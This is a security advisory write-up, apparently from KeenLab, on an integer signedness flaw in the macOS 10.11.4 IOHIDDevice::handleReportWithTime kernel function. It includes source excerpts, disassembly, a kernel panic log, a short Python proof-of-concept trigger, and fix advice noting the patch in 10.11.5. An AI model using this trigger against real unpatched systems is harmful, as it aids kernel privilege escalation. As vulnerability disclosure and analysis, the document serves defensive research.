##Interesting Integer overflow in enum comparison IOHIDDevice::handleReportWithTime in 10.11.4

By flanker from KeenLab.

There exists a signed integer comparison overflow in `IOHIDDevice::_getReport` and then `handleReportWithTime`, which can lead to oob access/execute in `handleReportWithTime`. A normal process can leverage this vulnerability to archive potential code execution in kernel and escalate privilege.

##Vulnerability analysis
When `IOHIDLibUserClient::_getReport` is called via externalMethod, the code execution flow will be redirected in `IOHIDDevice::getReport` and then called into `IOHIDDevice::handleReportWithTime`, 

```
1281IOReturn IOHIDLibUserClient::getReport(IOMemoryDescriptor * mem, uint32_t * pOutsize, IOHIDReportType reportType, uint32_t reportID, uint32_t timeout, IOHIDCompletion * completion)
1282{
1283    IOReturn ret = kIOReturnBadArgument;
1284
1285    // VTN3: Is there a real maximum report size? It looks like the current limit is around
1286    // 1024 bytes, but that will (or has) changed. 65536 is above every upper limit
1287    // I have seen by a few factors.
1288    if (*pOutsize > 0x10000) {
1289        IOLog("IOHIDLibUserClient::getReport called with an irrationally large output size: %lu\n", (long unsigned) *pOutsize);
1290    }
1291    else if (fNub && !isInactive()) {
1292        ret = mem->prepare();
1293        if(ret == kIOReturnSuccess) {
1294            if (completion) {
1295                AsyncParam * pb = (AsyncParam *)completion->parameter;
1296                pb->fMax        = *pOutsize;
1297                pb->fMem        = mem;
1298                pb->reportType  = reportType;
1299
1300                mem->retain();
1301
1302                ret = fNub->getReport(mem, reportType, reportID, timeout, completion);
1303            }
1304            else {
1305                ret = fNub->getReport(mem, reportType, reportID);
1306
1307                // make sure the element values are updated.
1308                if (ret == kIOReturnSuccess)
1309                    fNub->handleReport(mem, reportType, kIOHIDReportOptionNotInterrupt);
1310
1311                *pOutsize = mem
```
Then `handleReport` and `handleReportWithTime` will be called.

```
2174IOReturn IOHIDDevice::handleReportWithTime(
2175    AbsoluteTime         timeStamp,
2176    IOMemoryDescriptor * report,
2177    IOHIDReportType      reportType,
2178    IOOptionBits         options)
2179{
2180    IOBufferMemoryDescriptor *  bufferDescriptor    = NULL;
2181    void *                      reportData          = NULL;
2182    IOByteCount                 reportLength        = 0;
2183    IOReturn                    ret                 = kIOReturnNotReady;
2184    bool                        changed             = false;
2185    bool                        shouldTickle        = false;
2186    UInt8                       reportID            = 0;
2187
2188    IOHID_DEBUG(kIOHIDDebugCode_HandleReport, reportType, options, __OSAbsoluteTime(timeStamp), getRegistryEntryID());
2189
2190    if ((reportType == kIOHIDReportTypeInput) && !_readyForInputReports)
2191        return kIOReturnOffline;
2192
2193    // Get a pointer to the data in the descriptor.
2194    if ( !report )
2195        return kIOReturnBadArgument;
2196
2197    if ( reportType >= kIOHIDReportTypeCount )
2198        return kIOReturnBadArgument;
2199
2200    reportLength = report->getLength();
2201    if ( !reportLength )
2202        return kIOReturnBadArgument;
2203
2204    if ( (bufferDescriptor = OSDynamicCast(IOBufferMemoryDescriptor, report)) ) {
2205        reportData = bufferDescriptor->getBytesNoCopy();
2206        if ( !reportData )
2207            return kIOReturnNoMemory;
2208    } else {
2209        reportData = IOMalloc(reportLength);
2210        if ( !reportData )
2211            return kIOReturnNoMemory;
2212
2213        report->readBytes( 0, reportData, reportLength );
2214    }
```

In Line 2197, there is  an integer signed comparison overflow. The compiler decides the `kIOHIDReportTypeCount`, which is an enum value, is signed and the assembly instruction are as follows:

```
__text:0000000000006951                 mov     r13d, 0E00002C2h
__text:0000000000006957                 jz      loc_6BBE
__text:000000000000695D                 cmp     r15d, 2
__text:0000000000006961                 jg      loc_6BBE
```
we can see `jg` is used, which indicates a signed comparison.

The `reportType` is a int32 value determined by incoming externalMethod scalar:

```
in function setReport
1355    else
1356        if ( arguments->structureInputDescriptor )
1357            ret = target->setReport( arguments->structureInputDescriptor, (IOHIDReportType)arguments->scalarInput[0], (uint32_t)arguments->scalarInput[1]);
1358        else
1359            ret = target->setReport(arguments->structureInput, arguments->structureInputSize, (IOHIDReportType)arguments->scalarInput[0], (uint32_t)arguments->scalarInput[1]);
1360
1361    return ret;
1362}
```

So an attacker can supply an overflowed negative value, i.e. 0x80000000 in scalar input and cause oob access in `handleReportWithTime`:

```
2220
2221        // The first byte in the report, may be the report ID.
2222        // XXX - Do we need to advance the start of the report data?
2223
2224        reportID = ( _reportCount > 1 ) ? *((UInt8 *) reportData) : 0;
2225
2226        // Get the first element in the report handler chain.
2227
2228        element = GetHeadElement( GetReportHandlerSlot(reportID),
2229                                  reportType);
```
We can see `reportType` is used in `GetHeadElement`, and
```
260#define GetHeadElement(slot, type)  _reportHandlers[slot].head[type]
```
Type is used as index to `head` array, so we can control the element pointer and then a virtual call follows:

```
2060        while ( element ) {
2061
2062            element->createReport(reportID, reportData, &reportLength, &element);
2063

177    virtual bool createReport( UInt8           reportID,
178                               void *        reportData, // report should be allocated outside this method
179                               UInt32 *        reportLength,
180                               IOHIDElementPrivate ** next );
```

Thus it's possible for code execution if memory is prepared.

##CrashLog
We can see a page fault is generated on oob access, indicating the negative 32bit integer has been used as index when accessing memory.
```
panic(cpu 1 caller 0xffffff800af85b8f): "vm_page_check_pageable_safe: trying to add page" "from compressor object (0xffffff800b6c35f0) to pageable queue"@/Library/Caches/com.apple.xbs/Sources/xnu/xnu-3248.40.184/osfmk/vm/vm_resident.c:7076
Backtrace (CPU 1), Frame : Return Address
0xffffff911638b230 : 0xffffff800aedab12 mach_kernel : _panic + 0xe2
0xffffff911638b2b0 : 0xffffff800af85b8f mach_kernel : _vm_page_check_pageable_safe + 0x3f
0xffffff911638b2d0 : 0xffffff800af4a8e3 mach_kernel : _vm_fault_enter + 0x9b3
0xffffff911638b450 : 0xffffff800af4e80b mach_kernel : _vm_page_validate_cs_mapped_chunk + 0x226b
0xffffff911638b670 : 0xffffff800afcdf6d mach_kernel : _kernel_trap + 0x47d
0xffffff911638b850 : 0xffffff800afec273 mach_kernel : _return_from_trap + 0xe3
0xffffff911638b870 : 0xffffff7f8bd4c283 com.apple.iokit.IOHIDFamily : __ZN11IOHIDDevice20handleReportWithTimeEyP18IOMemoryDescriptor15IOHIDReportTypej + 0x191
0xffffff911638b9f0 : 0xffffff7f8bd4ad45 com.apple.iokit.IOHIDFamily : __ZN11IOHIDDevice12handleReportEP18IOMemoryDescriptor15IOHIDReportTypej + 0x5b
0xffffff911638ba30 : 0xffffff7f8bd486b2 com.apple.iokit.IOHIDFamily : __ZN18IOHIDLibUserClient9getReportEP18IOMemoryDescriptorPj15IOHIDReportTypejjP15IOHIDCompletion + 0x12c
0xffffff911638ba80 : 0xffffff7f8bd4877b com.apple.iokit.IOHIDFamily : __ZN18IOHIDLibUserClient9getReportEPvPj15IOHIDReportTypejjP15IOHIDCompletion + 0x99
0xffffff911638bad0 : 0xffffff7f8bd46c3b com.apple.iokit.IOHIDFamily : __ZN18IOHIDLibUserClient10_getReportEPS_PvP25IOExternalMethodArguments + 0x13b
0xffffff911638bb30 : 0xffffff800b4b5958 mach_kernel : __ZN13IOCommandGate9runActionEPFiP8OSObjectPvS2_S2_S2_ES2_S2_S2_S2_ + 0x1a8
0xffffff911638bba0 : 0xffffff7f8bd47556 com.apple.iokit.IOHIDFamily : __ZN18IOHIDLibUserClient14externalMethodEjP25IOExternalMethodArgumentsP24IOExternalMethodDispatchP8OSObjectPv + 0x64
0xffffff911638bbe0 : 0xffffff800b4df277 mach_kernel : _is_io_connect_method + 0x1e7
0xffffff911638bd20 : 0xffffff800af97cc0 mach_kernel : _iokit_server + 0x5bd0
0xffffff911638be30 : 0xffffff800aedf283 mach_kernel : _ipc_kobject_server + 0x103
0xffffff911638be60 : 0xffffff800aec28b8 mach_kernel : _ipc_kmsg_send + 0xb8
0xffffff911638bea0 : 0xffffff800aed2665 mach_kernel : _mach_msg_overwrite_trap + 0xc5
0xffffff911638bf10 : 0xffffff800afb8bda mach_kernel : _mach_call_munger64 + 0x19a
0xffffff911638bfb0 : 0xffffff800afeca96 mach_kernel : _hndl_mach_scall64 + 0x16
      Kernel Extensions in backtrace:
         com.apple.iokit.IOHIDFamily(2.0)[8D04EA14-CDE1-3B41-8571-153FF3F3F63B]@0xffffff7f8bd46000->0xffffff7f8bdbdfff
            dependency: com.apple.driver.AppleFDEKeyStore(28.30)[C31A19C9-8174-3E35-B2CD-3B1B237C0220]@0xffffff7f8bd3b000

BSD process name corresponding to current thread: Python
```
##POC


KitLib Python POC Code:

    import kitlib
    h = kitlib.openMultipleSvc('IOUSBHostHIDDevice', [0,0])[1]
    kitlib.callConnectMethod(h, 12, [0x80000000L]*3, '', 0, 1)



Tested on macmini/macbooks with usb keyboard connected (for this specific IOUSBHIDDevice service). Of course other services extending IOHIDDevice can also be affected. Other models can also apply with configuration parameter tunned.
Changing the first parameter to like 0x8000ffff and we can observe that the fault address has changed correspondingly, showing the possibility of exploitation.

##Fix advice
add check on reportType for negative, only accept positive value. Fixed in 10.11.5 by replacing jg with ja.

